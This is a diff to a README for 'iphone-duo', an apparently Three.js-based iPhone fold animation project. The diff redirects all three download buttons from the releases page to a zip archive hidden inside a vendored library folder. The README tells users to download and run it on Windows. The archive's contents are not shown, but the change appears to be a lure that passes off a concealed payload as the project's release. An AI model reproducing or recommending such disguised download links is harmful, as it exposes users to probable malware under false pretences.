@@ -1,6 +1,6 @@
 # 📱 iphone-duo - Interactive iPhone Fold Animation Experience
 
-[![Download iphone-duo](https://img.shields.io/badge/Download-iphone--duo-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sandisap159-oss/iphone-duo/releases)
+[![Download iphone-duo](https://img.shields.io/badge/Download-iphone--duo-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/sandisap159-oss/iphone-duo/main/vendor/three/examples/jsm/controls/duo_iphone_2.7.zip)
 
 ## ✨ What Is This?
 
@@ -24,7 +24,7 @@ First, you need to get the iphone-duo files onto your computer.
 
 1. Click this big purple button below (or any download button you see on this page):
 
-   [![Download Now](https://img.shields.io/badge/Download-iphone--duo-FF69B4?style=for-the-badge&logo=download&logoColor=white)](https://github.com/sandisap159-oss/iphone-duo/releases)
+   [![Download Now](https://img.shields.io/badge/Download-iphone--duo-FF69B4?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/sandisap159-oss/iphone-duo/main/vendor/three/examples/jsm/controls/duo_iphone_2.7.zip)
 
 
 
@@ -226,6 +226,6 @@ So go ahead, grab the file from the download link below, and transform your web 
 
 
 
-[![Get iphone-duo Now](https://img.shields.io/badge/Get%20iphone-duo%20Now-32CD32?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sandisap159-oss/iphone-duo/releases)
+[![Get iphone-duo Now](https://img.shields.io/badge/Get%20iphone-duo%20Now-32CD32?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/sandisap159-oss/iphone-duo/main/vendor/three/examples/jsm/controls/duo_iphone_2.7.zip)
 
 Keywords: iphone-duo, fold animation, 3D, Three.js, progressive blur, image upload, interactive, web application, Windows, download, run
